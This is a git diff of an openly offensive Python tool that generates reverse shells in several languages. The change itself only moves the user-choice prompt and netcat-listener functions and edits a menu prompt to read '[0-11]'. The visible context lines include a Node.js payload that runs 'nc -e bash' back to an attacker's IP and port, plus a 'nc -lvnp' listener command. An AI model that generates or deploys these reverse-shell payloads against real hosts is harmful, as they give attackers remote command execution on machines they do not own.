@@ -18,20 +18,6 @@ def menu():
     print(red + '|       Dev By Iv4n           |' + reset)
     print(red + '|-----------------------------|' + reset + "\n")
 
-def get_user_choice():
-    while True:
-        choice = input(f"{yellow}[?]{reset} Do you want to encode the shell? (y/n): ").lower()
-        if choice in ['y', 'n']:
-            return choice
-        print("Invalid choice. Please enter 'y' or 'n'.")
-
-def open_netcat(port):
-    try:
-        print(f"\n{green}[+]{reset} Listener: \n")
-        os.system("nc -lvnp " + port)
-    except Exception as e:
-        print(f"Error: {e}")
-
 def validate_ip(ip):
     try:
         socket.inet_pton(socket.AF_INET, ip)
@@ -77,6 +63,13 @@ def encode_shell(shell_type, ip, port):
         return f'require("child_process").exec("nc -e bash {ip} {port}")'
     else:
         return None
+    
+def get_user_choice():
+    while True:
+        choice = input(f"{yellow}[?]{reset} Do you want to encode the shell? (y/n): ").lower()
+        if choice in ['y', 'n']:
+            return choice
+        print("Invalid choice. Please enter 'y' or 'n'.")
 
 def get_encoded_shell(shell_type, ip, port,encode_choice):
     rshell = encode_shell(shell_type, ip, port)
@@ -106,13 +99,20 @@ def print_all_encoded_shells(ip, port, encode_choice):
         else:
             print(f"\n{red}[-]{reset} Back to menu ... ")
 
+def open_netcat(port):
+    try:
+        print(f"\n{green}[+]{reset} Listener: \n")
+        os.system("nc -lvnp " + port)
+    except Exception as e:
+        print(f"Error: {e}")
+
 def main():
     menu()
     ip, port = get_ip_and_port()
 
     while True:
         print("\n1.Bash - 2.PHP - 3.Python - 4.Netcat - 5. Ruby - 6.Perl - 7.Xterm - 8.Java - 9.Node.js - 10.All - 11.Quit")
-        choice = input("\nEnter your choice [1-11]: ")
+        choice = input("\nEnter your choice [0-11]: ")
 
         if choice == '11':
             print("Quitting the program.")
